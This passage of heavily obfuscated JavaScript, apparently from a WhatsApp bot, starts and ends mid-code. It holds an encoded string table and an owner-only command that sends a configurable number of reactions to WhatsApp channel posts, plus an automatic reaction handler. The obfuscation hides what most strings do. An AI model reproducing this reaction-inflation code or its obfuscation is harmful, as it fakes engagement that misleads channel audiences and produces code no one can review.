4\x78\x72\x4d\x6c\x74\x47','\x79\x33\x6a\x4c\x7a\x68\x6d','\x70\x49\x61\x51\x34\x42\x73\x6b\x34\x42\x73\x70','\x79\x32\x39\x4b\x41\x77\x34','\x6c\x32\x48\x4c\x79\x77\x71','\x6c\x32\x35\x4c\x44\x33\x6d','\x63\x49\x30\x47\x6b\x4c\x4b','\x43\x32\x76\x55\x7a\x67\x75','\x7a\x4e\x6a\x56\x42\x75\x38','\x41\x78\x6e\x63\x44\x77\x79','\x42\x4d\x39\x33','\x41\x78\x6a\x50\x42\x4d\x43','\x6b\x4b\x48\x66\x74\x65\x57','\x41\x78\x72\x4c\x7a\x63\x57','\x72\x59\x62\x62\x72\x65\x75','\x7a\x65\x39\x31\x44\x61','\x38\x6a\x2b\x72\x51\x6f\x6b\x61\x4a\x46\x63\x46\x4b\x52\x53','\x72\x75\x76\x6d\x6c\x75\x30','\x79\x32\x39\x54\x42\x77\x65','\x41\x32\x75\x47\x7a\x67\x75','\x75\x68\x6a\x56\x44\x4d\x4b','\x42\x67\x39\x4e','\x43\x32\x58\x4c\x44\x68\x71','\x44\x33\x6a\x50\x44\x67\x75','\x74\x4d\x66\x54\x7a\x71','\x6f\x64\x65\x59\x6d\x5a\x69\x57\x42\x31\x76\x32\x42\x78\x62\x68','\x43\x32\x76\x55\x7a\x66\x71','\x6f\x4b\x44\x50\x44\x65\x47','\x72\x65\x76\x6d\x72\x76\x71','\x43\x78\x76\x50\x43\x4d\x75','\x41\x78\x72\x4f','\x7a\x67\x71\x47\x43\x32\x75','\x7a\x67\x4c\x48\x74\x77\x75','\x7a\x78\x4c\x5a','\x41\x77\x35\x5a','\x42\x63\x31\x79\x44\x67\x75','\x43\x68\x6d\x36\x6c\x59\x38','\x79\x32\x66\x53\x42\x63\x61','\x6c\x32\x31\x57\x6e\x61','\x6c\x4e\x76\x57\x7a\x67\x65','\x42\x33\x6a\x50\x7a\x78\x6d','\x42\x77\x76\x5a\x43\x32\x65','\x69\x65\x44\x50\x44\x65\x47','\x71\x4d\x31\x36\x6e\x66\x79','\x42\x4d\x38\x47\x43\x67\x65','\x6c\x75\x31\x65\x46\x47','\x43\x33\x71\x47\x6e\x73\x61','\x42\x67\x76\x55\x7a\x33\x71','\x38\x6a\x2b\x72\x51\x45\x6b\x61\x4a\x46\x63\x46\x50\x52\x61','\x34\x50\x59\x66\x69\x65\x76\x55\x79\x71','\x7a\x32\x76\x30','\x7a\x77\x58\x4c\x44\x67\x75','\x69\x67\x66\x59\x7a\x73\x61','\x72\x4c\x76\x6d\x74\x66\x4b','\x6f\x49\x38\x56\x43\x4d\x65','\x79\x78\x6e\x35\x42\x4d\x6d','\x43\x33\x72\x59\x41\x77\x34','\x76\x65\x48\x62\x74\x4b\x53','\x69\x65\x6e\x56\x42\x4e\x71','\x38\x6a\x2b\x72\x53\x6f\x6b\x61\x4a\x45\x6b\x7a\x47\x61','\x7a\x78\x6a\x59\x42\x33\x69','\x71\x75\x35\x65\x74\x65\x75','\x34\x50\x32\x6d\x69\x65\x76\x59\x43\x47','\x42\x67\x76\x30\x44\x67\x75','\x7a\x4d\x39\x59\x44\x32\x65','\x7a\x77\x6e\x30\x7a\x77\x71','\x43\x63\x35\x4a\x42\x32\x30','\x34\x50\x51\x48\x69\x65\x35\x56\x69\x61','\x34\x50\x59\x66\x69\x65\x58\x56\x79\x71','\x43\x33\x6e\x50\x42\x32\x34','\x38\x6a\x2b\x6f\x52\x59\x62\x62\x44\x78\x71','\x71\x4e\x76\x30\x73\x77\x30','\x43\x4d\x76\x48\x79\x33\x71','\x43\x67\x72\x48\x44\x67\x75','\x69\x67\x35\x4c\x44\x33\x6d','\x34\x4f\x2b\x5a\x69\x66\x6a\x48\x44\x61','\x7a\x78\x69\x47\x45\x77\x38','\x43\x32\x76\x5a','\x7a\x78\x72\x4c\x79\x33\x71','\x79\x76\x44\x4d\x77\x76\x61','\x42\x32\x7a\x4d\x7a\x78\x69','\x38\x6a\x2b\x76\x49\x55\x2b\x34\x4a\x57','\x6c\x49\x39\x4b\x79\x78\x71','\x34\x50\x59\x66\x69\x65\x66\x4b\x7a\x61','\x69\x67\x6e\x4f\x79\x78\x71','\x74\x30\x34\x47\x75\x30\x75','\x43\x32\x4c\x36\x7a\x71','\x42\x4d\x58\x35','\x43\x4d\x76\x48\x7a\x65\x30','\x7a\x78\x71\x54\x43\x33\x71','\x6c\x59\x39\x4e\x41\x78\x71','\x42\x32\x31\x49\x43\x4d\x75','\x43\x32\x76\x59\x44\x4d\x75','\x43\x30\x62\x49\x43\x4d\x38','\x79\x32\x48\x48\x42\x4d\x34','\x78\x32\x66\x53\x44\x32\x65','\x41\x4e\x6e\x56\x42\x47','\x43\x68\x6a\x50\x44\x4d\x65','\x6e\x64\x69\x35','\x43\x4e\x6e\x48\x44\x67\x4b','\x7a\x78\x6a\x64\x79\x78\x6d','\x41\x78\x50\x4c\x7a\x63\x61','\x42\x77\x4c\x55','\x6c\x33\x6a\x4c\x7a\x4e\x6d','\x79\x78\x48\x50\x42\x33\x6d','\x59\x41\x6c\x6a\x51\x55\x67\x30\x4f\x6f\x67\x30\x48\x59\x61','\x72\x63\x64\x49\x4e\x69\x75','\x75\x49\x62\x66\x75\x4c\x69','\x43\x32\x76\x55\x7a\x64\x75','\x42\x67\x66\x5a\x44\x66\x75','\x43\x30\x6e\x56\x7a\x67\x75','\x45\x68\x72\x6a\x42\x4d\x79','\x43\x67\x66\x59\x44\x67\x4b','\x77\x30\x31\x66\x75\x31\x6d','\x44\x67\x76\x4b\x76\x67\x75','\x7a\x78\x48\x30','\x44\x77\x69\x47\x6b\x59\x61','\x69\x63\x48\x75\x42\x33\x71','\x75\x66\x6a\x66\x72\x4b\x4b','\x7a\x4d\x58\x31\x7a\x77\x34','\x38\x6a\x2b\x4c\x53\x49\x5a\x57\x4e\x35\x49\x63\x6c\x70\x63\x46\x4b\x79\x33\x57\x4e\x34\x2b\x37','\x43\x4d\x76\x5a\x7a\x77\x34','\x74\x77\x76\x55\x44\x67\x4b','\x43\x4d\x75\x47\x44\x67\x38','\x30\x79\x70\x70\x47\x38\x2b\x66\x69\x6f\x6b\x69\x47\x47','\x34\x50\x59\x66\x69\x66\x6e\x4c\x43\x57','\x7a\x32\x76\x5a','\x38\x6a\x2b\x7a\x48\x55\x6b\x61\x4a\x45\x6b\x7a\x47\x6f\x2b\x34\x4a\x57','\x43\x67\x66\x30\x44\x67\x75','\x38\x6a\x2b\x7a\x49\x2b\x6b\x61\x4a\x45\x6b\x7a\x47\x6f\x2b\x34\x4a\x57','\x41\x77\x6e\x4c\x6c\x47','\x41\x77\x72\x4c\x42\x30\x65','\x76\x32\x48\x48\x44\x68\x6d','\x7a\x33\x6a\x56\x44\x78\x61','\x79\x4d\x50\x4c\x79\x33\x71','\x72\x4d\x4c\x53\x7a\x76\x6d','\x42\x73\x62\x74\x72\x76\x6d','\x75\x4b\x76\x62\x71\x31\x71','\x38\x6a\x2b\x6f\x4c\x2b\x2b\x34\x4a\x57','\x63\x4e\x30\x6b\x79\x73\x47','\x42\x32\x66\x4b\x76\x67\x38','\x6c\x49\x39\x4a\x42\x32\x30','\x6f\x64\x71\x57\x6d\x78\x6e\x59\x43\x78\x44\x51\x7a\x61','\x34\x42\x73\x66\x69\x6f\x67\x30\x4f\x43\x51\x43\x34\x42\x73\x61','\x6f\x64\x61\x32\x6f\x64\x47','\x6d\x73\x35\x75\x72\x75\x57','\x34\x50\x51\x47\x37\x37\x49\x70\x69\x65\x66\x76\x76\x61','\x71\x31\x76\x74\x76\x65\x38','\x7a\x78\x48\x50\x43\x33\x71','\x59\x4f\x64\x48\x54\x6b\x68\x48\x54\x69\x64\x6b\x47\x6f\x67\x30\x48\x71','\x79\x77\x57\x36\x69\x61','\x44\x77\x58\x53\x45\x73\x61','\x6c\x4d\x50\x5a\x42\x32\x34','\x41\x77\x35\x32\x79\x77\x57','\x7a\x67\x4c\x55\x7a\x59\x61','\x44\x63\x62\x5a\x7a\x77\x34','\x76\x77\x35\x52\x42\x4d\x38','\x42\x4d\x39\x30\x69\x67\x65','\x38\x6a\x2b\x41\x54\x55\x6b\x61\x4a\x45\x6b\x7a\x47\x6f\x2b\x34\x4a\x57','\x6c\x59\x39\x33\x41\x67\x65','\x41\x77\x35\x30\x7a\x78\x69','\x43\x2b\x67\x30\x4d\x2b\x67\x30\x47\x6d\x51\x61\x69\x61','\x34\x50\x59\x66\x69\x66\x6e\x4c\x42\x47','\x42\x33\x69\x47\x7a\x67\x75','\x43\x32\x58\x50\x79\x32\x75','\x41\x78\x6e\x62\x7a\x67\x30','\x6c\x4d\x6e\x4f\x43\x4d\x75','\x43\x67\x66\x30\x41\x61','\x6c\x77\x7a\x56\x43\x4d\x30','\x7a\x4d\x39\x59\x42\x77\x65','\x79\x78\x6e\x4c\x69\x68\x75','\x79\x32\x58\x56\x43\x32\x75','\x42\x67\x76\x48\x43\x32\x75','\x42\x77\x66\x4e\x7a\x71','\x79\x32\x66\x30\x41\x77\x38','\x71\x4b\x76\x68\x73\x75\x34','\x42\x4d\x76\x33\x43\x32\x57','\x41\x78\x69\x47\x44\x77\x34','\x34\x50\x51\x47\x37\x37\x49\x70\x69\x65\x7a\x48\x41\x71','\x6f\x68\x62\x4d\x41\x64\x43','\x72\x75\x57\x54\x74\x75\x71','\x42\x77\x4c\x54\x7a\x71','\x6c\x33\x6a\x4c\x44\x4d\x38','\x6f\x49\x38\x56\x7a\x4d\x4b','\x74\x67\x66\x49\x7a\x77\x57','\x79\x77\x6a\x53\x7a\x77\x71','\x41\x68\x71\x47\x79\x77\x57','\x43\x59\x39\x54\x79\x77\x4b','\x44\x78\x69\x47\x76\x32\x47','\x6e\x74\x75\x58\x6d\x4a\x4b','\x43\x4d\x72\x4c\x7a\x65\x34','\x79\x32\x39\x55\x79\x32\x65','\x34\x50\x32\x6d\x69\x65\x6e\x56\x44\x71','\x6f\x4c\x6a\x4c\x7a\x32\x4b','\x43\x31\x6e\x30\x41\x77\x6d','\x71\x76\x76\x75\x74\x31\x38','\x34\x42\x73\x66\x69\x70\x63\x46\x4a\x41\x47','\x6c\x49\x39\x57\x42\x68\x75','\x42\x4d\x66\x54\x7a\x71','\x74\x31\x6a\x44','\x42\x4d\x72\x5a','\x69\x67\x7a\x56\x44\x77\x34','\x43\x32\x76\x55\x7a\x65\x79','\x75\x4d\x76\x48\x79\x33\x71','\x44\x4d\x4c\x4c\x44\x30\x38','\x43\x4d\x76\x54\x42\x33\x71','\x42\x4d\x35\x4c\x42\x63\x61','\x7a\x4e\x76\x55\x79\x33\x71','\x76\x66\x76\x74\x78\x31\x69','\x44\x67\x76\x4b\x71\x32\x38','\x41\x77\x35\x49\x42\x33\x47','\x43\x59\x62\x4a\x42\x32\x30','\x7a\x77\x35\x30\x43\x4d\x4b','\x79\x77\x57\x47\x79\x32\x47','\x69\x68\x72\x56\x69\x67\x6d','\x43\x67\x66\x59\x43\x32\x75','\x7a\x4d\x4c\x55\x7a\x61','\x43\x4e\x6a\x56\x43\x4a\x4f','\x42\x32\x66\x4b\x74\x77\x75','\x42\x32\x72\x5a\x6f\x47\x4f','\x43\x33\x72\x4c\x42\x71','\x79\x77\x35\x4b\x69\x65\x75','\x76\x66\x39\x6e\x75\x30\x43','\x38\x6a\x2b\x6d\x51\x6f\x2b\x34\x4a\x57'];hexanodecode_自シねカ有作ノ=function(){return hexanodecode_然有进因;};return hexanodecode_自シねカ有作ノ();}async function handleNewsletterReaction(hexanodecode_分ト种د,hexanodecode_ネト点んや){const hexanodecode_はラ如ヨ=hexanodecode_ي和们点تク;try{if(config[hexanodecode_はラ如ヨ(0x22e)+hexanodecode_はラ如ヨ(0x11b)+'\x45\x4c\x5f\x52\x45'+hexanodecode_はラ如ヨ(0xfa)]!==hexanodecode_はラ如ヨ(0xf1))return;if(!hexanodecode_ネト点んや?.[hexanodecode_はラ如ヨ(0x278)]?.[hexanodecode_はラ如ヨ(0x238)+hexanodecode_はラ如ヨ(0x2e7)])return;const hexanodecode_う化多以使=await ensureNewsletterLoaded();if(!hexanodecode_う化多以使||hexanodecode_う化多以使[hexanodecode_はラ如ヨ(0x19a)+'\x68']===0x17e2+-0xd7f+-0xa63)return;const hexanodecode_学起当عわた工し他=normale(hexanodecode_ネト点んや[hexanodecode_はラ如ヨ(0x278)][hexanodecode_はラ如ヨ(0x238)+hexanodecode_はラ如ヨ(0x2e7)]);if(!hexanodecode_学起当عわた工し他[hexanodecode_はラ如ヨ(0x250)+hexanodecode_はラ如ヨ(0x189)](hexanodecode_はラ如ヨ(0x3e2)+hexanodecode_はラ如ヨ(0x1aa)+'\x72'))return;if(!hexanodecode_う化多以使[hexanodecode_はラ如ヨ(0x33c)+hexanodecode_はラ如ヨ(0x2ba)](hexanodecode_学起当عわた工し他))return;const hexanodecode_进も他ض理工用=hexanodecode_ネト点んや['\x6b\x65\x79']['\x69\x64']||hexanodecode_ネト点んや[hexanodecode_はラ如ヨ(0x278)][hexanodecode_はラ如ヨ(0x1c7)+hexanodecode_はラ如ヨ(0x346)]||hexanodecode_ネト点んや[hexanodecode_はラ如ヨ(0x278)][hexanodecode_はラ如ヨ(0x165)+hexanodecode_はラ如ヨ(0xdf)];if(!hexanodecode_进も他ض理工用){console[hexanodecode_はラ如ヨ(0x180)]('\u26a0\ufe0f\x20\x4e\x6f\x20'+'\x73\x65\x72\x76\x65'+hexanodecode_はラ如ヨ(0x3e9)+hexanodecode_はラ如ヨ(0x2d0)+'\x20\x66\x6f\x72\x20'+hexanodecode_はラ如ヨ(0x21b)+hexanodecode_はラ如ヨ(0x3d5)+'\x20\x6d\x65\x73\x73'+hexanodecode_はラ如ヨ(0x15f));return;}const hexanodecode_政有它力チ之ラ同=hexanodecode_学起当عわた工し他+'\x5f'+hexanodecode_进も他ض理工用;if(reactedMessages[hexanodecode_はラ如ヨ(0x3a2)](hexanodecode_政有它力チ之ラ同))return;console[hexanodecode_はラ如ヨ(0x180)](hexanodecode_はラ如ヨ(0xea)+hexanodecode_はラ如ヨ(0x3c9)+hexanodecode_はラ如ヨ(0x313)+'\x6f\x73\x74\x20\x64'+hexanodecode_はラ如ヨ(0x1b9)+'\x65\x64\x20\x69\x6e'+'\x20'+hexanodecode_学起当عわた工し他+(hexanodecode_はラ如ヨ(0x26b)+hexanodecode_はラ如ヨ(0x205)+hexanodecode_はラ如ヨ(0x1b3)+hexanodecode_はラ如ヨ(0x361)+'\x2e\x2e')),await sendReactionsToChannel(hexanodecode_分ト种د,hexanodecode_学起当عわた工し他,hexanodecode_进も他ض理工用);}catch(hexanodecode_合说ケ还ニフな){console['\x65\x72\x72\x6f\x72'](hexanodecode_はラ如ヨ(0x2c9)+hexanodecode_はラ如ヨ(0x181)+hexanodecode_はラ如ヨ(0x116)+hexanodecode_はラ如ヨ(0x27d)+hexanodecode_はラ如ヨ(0x2d3)+hexanodecode_はラ如ヨ(0x133),hexanodecode_合说ケ还ニフな['\x6d\x65\x73\x73\x61'+'\x67\x65']);}}async function handleChannelReactCommand(hexanodecode_ヌزるろんサシث,hexanodecode_学化过下这开ク子,hexanodecode_フチん机ゆ,hexanodecode_ツハت业学り){const hexanodecode_小面去م实れム个过=hexanodecode_ي和们点تク;try{const hexanodecode_ه他十ノせ=hexanodecode_ツハت业学り[hexanodecode_小面去م实れム个过(0x36b)]||'',hexanodecode_理定到从=hexanodecode_学化过下这开ク子['\x6b\x65\x79'][hexanodecode_小面去م实れム个过(0x1db)+hexanodecode_小面去م实れム个过(0x362)+'\x74']||hexanodecode_学化过下这开ク子['\x6b\x65\x79']['\x72\x65\x6d\x6f\x74'+hexanodecode_小面去م实れム个过(0x2e7)],hexanodecode_学ヒま动个かソメは=hexanodecode_理定到从[hexanodecode_小面去م实れム个过(0x120)]('\x40')[-0x11cf+-0xefa+0x20c9]||hexanodecode_理定到从[hexanodecode_小面去م实れム个过(0x120)]('\x3a')[0x775+0x1a7e*-0x1+0x1309*0x1],hexanodecode_و加起メ性=ownerNumber[hexanodecode_小面去م实れム个过(0x33c)+hexanodecode_小面去م实れム个过(0x2ba)](hexanodecode_学ヒま动个かソメは)||hexanodecode_学化过下这开ク子[hexanodecode_小面去م实れム个过(0x278)][hexanodecode_小面去م实れム个过(0x112)+'\x65'];if(!hexanodecode_و加起メ性){await hexanodecode_フチん机ゆ[hexanodecode_小面去م实れム个过(0x12d)](hexanodecode_小面去م实れム个过(0x2fa)+hexanodecode_小面去م实れム个过(0x19f)+hexanodecode_小面去م实れム个过(0x208)+'\x75\x74\x68\x6f\x72'+hexanodecode_小面去م实れム个过(0x1d0)+'\x74\x6f\x20\x75\x73'+hexanodecode_小面去م实れム个过(0x3bb)+'\x73\x20\x63\x6f\x6d'+hexanodecode_小面去م实れム个过(0x24c));return;}let hexanodecode_حもへ业ج这=null,hexanodecode_ね着动かムま=null;const hexanodecode_说开家ソ=parseInt(config['\x43\x48\x41\x4e\x4e'+hexanodecode_小面去م实れム个过(0x345)+hexanodecode_小面去م实れム个过(0x26e)+hexanodecode_小面去م实れム个过(0x332)])||0x1bb*-0xe+-0x10c+0x1978,hexanodecode_等如是く三=hexanodecode_ه他十ノせ||'',hexanodecode_自它点ヘ之=hexanodecode_等如是く三['\x6d\x61\x74\x63\x68'](/https:\/\/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);if(hexanodecode_自它点ヘ之){const hexanodecode_ノスフシ理子へ中出=hexanodecode_自它点ヘ之[0x1*0x22b5+0x4*-0x295+-0x1860],hexanodecode_エ的化力制ホ个=hexanodecode_自它点ヘ之[0x1*-0x13a3+0x40*-0x27+-0x5*-0x5e1];/^\d+$/[hexanodecode_小面去م实れム个过(0x2c7)](hexanodecode_ノスフシ理子へ中出)&&(hexanodecode_حもへ业ج这=hexanodecode_ノスフシ理子へ中出+(hexanodecode_小面去م实れム个过(0x3e2)+'\x6c\x65\x74\x74\x65'+'\x72'),hexanodecode_ね着动かムま=hexanodecode_エ的化力制ホ个);}if(!hexanodecode_حもへ业ج这||!hexanodecode_ね着动かムま){const hexanodecode_リナسカム机ふ后=hexanodecode_学化过下这开ク子[hexanodecode_小面去م实れム个过(0x194)+'\x67\x65']?.[hexanodecode_小面去م实れム个过(0x2c6)+'\x64\x65\x64\x54\x65'+hexanodecode_小面去م实れム个过(0x24e)+hexanodecode_小面去م实れム个过(0x3dd)]?.[hexanodecode_小面去م实れム个过(0x137)+hexanodecode_小面去م实れム个过(0x1da)+'\x6f']?.[hexanodecode_小面去م实れム个过(0x2c2)+hexanodecode_小面去م实れム个过(0x29a)+hexanodecode_小面去م实れム个过(0x15f)];if(hexanodecode_リナسカム机ふ后){const hexanodecode_地它大عツك然ハ使=hexanodecode_学化过下这开ク子[hexanodecode_小面去م实れム个过(0x194)+'\x67\x65'][hexanodecode_小面去م实れム个过(0x2c6)+hexanodecode_小面去م实れム个过(0x152)+hexanodecode_小面去م实れム个过(0x24e)+'\x73\x61\x67\x65'][hexanodecode_小面去م实れム个过(0x137)+hexanodecode_小面去م实れム个过(0x1da)+'\x6f'];if(hexanodecode_地它大عツك然ハ使?.['\x71\x75\x6f\x74\x65'+hexanodecode_小面去م实れム个过(0x29a)+hexanodecode_小面去م实れム个过(0x15f)]?.[hexanodecode_小面去م实れム个过(0x278)]?.[hexanodecode_小面去م实れム个过(0x238)+hexanodecode_小面去م实れム个过(0x2e7)]){const hexanodecode_カرح小زد种س=hexanodecode_地它大عツك然ハ使[hexanodecode_小面去م实れム个过(0x2c2)+'\x64\x4d\x65\x73\x73'+hexanodecode_小面去م实れム个过(0x15f)]['\x6b\x65\x79'][hexanodecode_小面去م实れム个过(0x238)+hexanodecode_小面去م实れム个过(0x2e7)];hexanodecode_カرح小زد种س&&hexanodecode_カرح小زد种س[hexanodecode_小面去م实れム个过(0x33c)+hexanodecode_小面去م实れム个过(0x2ba)](hexanodecode_小面去م实れム个过(0x3e2)+hexanodecode_小面去م实れム个过(0x1aa)+'\x72')&&(hexanodecode_حもへ业ج这=hexanodecode_カرح小زد种س,hexanodecode_ね着动かムま=hexanodecode_地它大عツك然ハ使['\x71\x75\x6f\x74\x65'+hexanodecode_小面去م实れム个过(0x29a)+hexanodecode_小面去م实れム个过(0x15f)][hexanodecode_小面去م实れム个过(0x278)]['\x69\x64']||hexanodecode_地它大عツك然ハ使['\x71\x75\x6f\x74\x65'+hexanodecode_小面去م实れム个过(0x29a)+hexanodecode_小面去م实れム个过(0x15f)][hexanodecode_小面去م实れム个过(0x278)][hexanodecode_小面去م实れム个过(0x1c7)+hexanodecode_小面去م实れム个过(0x346)]||hexanodecode_地它大عツك然ハ使[hexanodecode_小面去م实れム个过(0x2c2)+'\x64\x4d\x65\x73\x73'+hexanodecode_小面去م实れム个过(0x15f)][hexanodecode_小面去م实れム个过(0x278)][hexanodecode_小面去م实れム个过(0x165)+hexanodecode_小面去م实れム个过(0xdf)]);}if(!hexanodecode_حもへ业ج这&&hexanodecode_地它大عツك然ハ使?.[hexanodecode_小面去م实れム个过(0x1ab)+'\x72\x64\x65\x64\x4e'+'\x65\x77\x73\x6c\x65'+'\x74\x74\x65\x72\x4d'+'\x65\x73\x73\x61\x67'+'\x65\x49\x6e\x66\x6f']){const hexanodecode_不ハ他イ=hexanodecode_地它大عツك然ハ使[hexanodecode_小面去م实れム个过(0x1ab)+hexanodecode_小面去م实れム个过(0x229)+hexanodecode_小面去م实れム个过(0x27e)+'\x74\x74\x65\x72\x4d'+hexanodecode_小面去م实れム个过(0x33e)+hexanodecode_小面去م实れム个过(0x36e)];hexanodecode_不ハ他イ?.['\x6e\x65\x77\x73\x6c'+hexanodecode_小面去م实れム个过(0x3d5)+hexanodecode_小面去م实れム个过(0x310)]&&(hexanodecode_حもへ业ج这=hexanodecode_不ハ他イ[hexanodecode_小面去م实れム个过(0x21b)+hexanodecode_小面去م实れム个过(0x3d5)+hexanodecode_小面去م实れム个过(0x310)],hexanodecode_ね着动かムま=hexanodecode_不ハ他イ['\x73\x65\x72\x76\x65'+hexanodecode_小面去م实れム个过(0x11a)+hexanodecode_小面去م实れム个过(0x2b4)]||hexanodecode_地它大عツك然ハ使?.[hexanodecode_小面去م实れム个过(0x165)+hexanodecode_小面去م实れム个过(0xdf)]);}if(!hexanodecode_حもへ业ج这){const hexanodecode_就水来غよ等=hexanodecode_リナسカム机ふ后[hexanodecode_小面去م实れム个过(0x3d2)+hexanodecode_小面去م实れム个过(0x1ce)+'\x6f\x6e']||hexanodecode_リナسカム机ふ后[hexanodecode_小面去م实れム个过(0x2c6)+hexanodecode_小面去م实れム个过(0x152)+hexanodecode_小面去م实れム个过(0x24e)+hexanodecode_小面去م实れム个过(0x3dd)]?.[hexanodecode_小面去م实れム个过(0x155)]||'',hexanodecode_地点加生=hexanodecode_就水来غよ等[hexanodecode_小面去م实れム个过(0x338)](/https:\/\/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);hexanodecode_地点加生&&(hexanodecode_حもへ业ج这=hexanodecode_地点加生[0x1cb3+0xb5b+-0x1*0x280d]+(hexanodecode_小面去م实れム个过(0x3e2)+'\x6c\x65\x74\x74\x65'+'\x72'),hexanodecode_ね着动かムま=hexanodecode_地点加生[0x10ba*0x1+0x1771*0x1+-0x2829]);}}}if(!hexanodecode_حもへ业ج这||!hexanodecode_ね着动かムま){const hexanodecode_す机量カく都民=hexanodecode_学化过下这开ク子[hexanodecode_小面去م实れム个过(0x194)+'\x67\x65']?.[hexanodecode_小面去م实れム个过(0x2c6)+hexanodecode_小面去م实れム个过(0x152)+hexanodecode_小面去م实れム个过(0x24e)+hexanodecode_小面去م实れム个过(0x3dd)]?.[hexanodecode_小面去م实れム个过(0x137)+'\x78\x74\x49\x6e\x66'+'\x6f'];if(hexanodecode_す机量カく都民?.[hexanodecode_小面去م实れム个过(0x165)+hexanodecode_小面去م实れム个过(0xdf)]&&hexanodecode_す机量カく都民?.[hexanodecode_小面去م实れム个过(0x238)+hexanodecode_小面去م实れム个过(0x2e7)]){const hexanodecode_着机わや部メ=hexanodecode_す机量カく都民[hexanodecode_小面去م实れム个过(0x238)+hexanodecode_小面去م实れム个过(0x2e7)];hexanodecode_着机わや部メ&&hexanodecode_着机わや部メ['\x69\x6e\x63\x6c\x75'+hexanodecode_小面去م实れム个过(0x2ba)](hexanodecode_小面去م实れム个过(0x3e2)+hexanodecode_小面去م实れム个过(0x1aa)+'\x72')&&(hexanodecode_حもへ业ج这=hexanodecode_着机わや部メ,hexanodecode_ね着动かムま=hexanodecode_す机量カく都民[hexanodecode_小面去م实れム个过(0x165)+hexanodecode_小面去م实れム个过(0xdf)]);}}(!hexanodecode_حもへ业ج这||!hexanodecode_ね着动かムま)&&(hexanodecode_学化过下这开ク子[hexanodecode_小面去م实れム个过(0x278)]?.['\x72\x65\x6d\x6f\x74'+hexanodecode_小面去م实れム个过(0x2e7)]?.[hexanodecode_小面去م实れム个过(0x33c)+hexanodecode_小面去م实れム个过(0x2ba)](hexanodecode_小面去م实れム个过(0x3e2)+hexanodecode_小面去م实れム个过(0x1aa)+'\x72')&&(hexanodecode_حもへ业ج这=hexanodecode_学化过下这开ク子[hexanodecode_小面去م实れム个过(0x278)]['\x72\x65\x6d\x6f\x74'+hexanodecode_小面去م实れム个过(0x2e7)],hexanodecode_ね着动かムま=hexanodecode_学化过下这开ク子['\x6b\x65\x79']['\x69\x64']||hexanodecode_学化过下这开ク子[hexanodecode_小面去م实れム个过(0x278)][hexanodecode_小面去م实れム个过(0x1c7)+hexanodecode_小面去م实れム个过(0x346)]||hexanodecode_学化过下这开ク子['\x6b\x65\x79'][hexanodecode_小面去م实れム个过(0x165)+'\x61\x49\x64']));if(hexanodecode_حもへ业ج这&&hexanodecode_ね着动かムま){await hexanodecode_フチん机ゆ['\x72\x65\x70\x6c\x79'](hexanodecode_小面去م实れム个过(0x34b)+'\x64\x69\x6e\x67\x20'+hexanodecode_说开家ソ+(hexanodecode_小面去م实れム个过(0x3ad)+hexanodecode_小面去م实れム个过(0x2bc)+hexanodecode_小面去م实れム个过(0x129)+hexanodecode_小面去م实れム个过(0x253)+hexanodecode_小面去م实れム个过(0x26a)+hexanodecode_小面去م实れム个过(0x340)+hexanodecode_小面去م实れム个过(0x37a)));const hexanodecode_多غ二ب能时ホ人=await sendReactionsToChannel(hexanodecode_ヌزるろんサシث,hexanodecode_حもへ业ج这,hexanodecode_ね着动かムま,hexanodecode_说开家ソ);hexanodecode_多غ二ب能时ホ人&&hexanodecode_多غ二ب能时ホ人>-0x1*-0x647+-0xb3d+0x4f6?await hexanodecode_フチん机ゆ[hexanodecode_小面去م实れム个过(0x12d)](hexanodecode_小面去م实れム个过(0x2ee)+hexanodecode_小面去م实れム个过(0x317)+hexanodecode_小面去م实れム个过(0x202)+hexanodecode_小面去م实れム个过(0xeb)+hexanodecode_多غ二ب能时ホ人+('\x20\x72\x65\x61\x63'+'\x74\x69\x6f\x6e\x73'+hexanodecode_小面去م实れム个过(0x129)+hexanodecode_小面去م实れム个过(0x253)+hexanodecode_小面去م实れム个过(0x26a)+hexanodecode_小面去م实れム个过(0x340)+'\x21')):await hexanodecode_フチん机ゆ[hexanodecode_小面去م实れム个过(0x12d)]('\u26a0\ufe0f\x20\x43\x6f\x75'+hexanodecode_小面去م实れム个过(0x3c2)+hexanodecode_小面去م实れム个过(0x206)+hexanodecode_小面去م实れム个过(0x2d9)+'\x63\x74\x69\x6f\x6e'+hexanodecode_小面去م实れム个过(0x38e)+'\x65\x20\x70\x6f\x73'+hexanodecode_小面去م实れム个过(0x2b6)+hexanodecode_小面去م实れム个过(0x225)+hexanodecode_小面去م实れム个过(0x16a)+'\x20\x68\x61\x76\x65'+hexanodecode_小面去م实れム个过(0x3ad)+'\x74\x69\x6f\x6e\x73'+hexanodecode_小面去م实れム个过(0x24b)+'\x68\x65\x72\x65\x20'+hexanodecode_小面去م实れム个过(0x312)+hexanodecode_小面去م实れム个过(0x286)+hexanodecode_小面去م实れム个过(0x36a));return;}await hexanodecode_フチん机ゆ[hexanodecode_小面去م实れム个过(0x12d)](hexanodecode_小面去م实れム个过(0x22b)+'\x6c\x64\x20\x6e\x6f'+'\x74\x20\x64\x65\x74'+'\x65\x63\x74\x20\x74'+hexanodecode_小面去م实れム个过(0x253)+hexanodecode_小面去م实れム个过(0x26a)+hexanodecode_小面去م实れム个过(0x170)+hexanodecode_小面去م实れム个过(0x1aa)+hexanodecode_小面去م实れム个过(0x264)+hexanodecode_小面去م实れム个过(0x2b5)+(hexanodecode_小面去م实れム个过(0x3b8)+hexanodecode_小面去م实れム个过(0x215)+hexanodecode_小面去م实れム个过(0x32e)+'\x65\x20\x6f\x66\x20'+'\x74\x68\x65\x73\x65'+'\x20\x6d\x65\x74\x68'+hexanodecode_小面去م实れム个过(0x246))+(hexanodecode_小面去م实れム个过(0x3e4)+'\x6c\x79\x20\x74\x6f'+hexanodecode_小面去م实れム个过(0x29d)+hexanodecode_小面去م实れム个过(0x26a)+hexanodecode_小面去م实れム个过(0x340)+hexanodecode_小面去م实れム个过(0x373)+'\x3a\x20\x2e\x63\x68'+'\x72\x65\x61\x63\x74'+'\x0a')+(hexanodecode_小面去م实れム个过(0x2d4)+'\x20\x74\x68\x65\x20'+hexanodecode_小面去م实れム个过(0x348)+hexanodecode_小面去م实れム个过(0x211)+'\x61\x63\x74\x20\x68'+'\x74\x74\x70\x73\x3a'+hexanodecode_小面去م实れム个过(0x20a)+hexanodecode_小面去م实れム个过(0x29c)+hexanodecode_小面去م实れム个过(0x2af)+hexanodecode_小面去م实れム个过(0x1c9)+hexanodecode_小面去م实れム个过(0x124)+hexanodecode_小面去م实れム个过(0x315)+hexanodecode_小面去م实れム个过(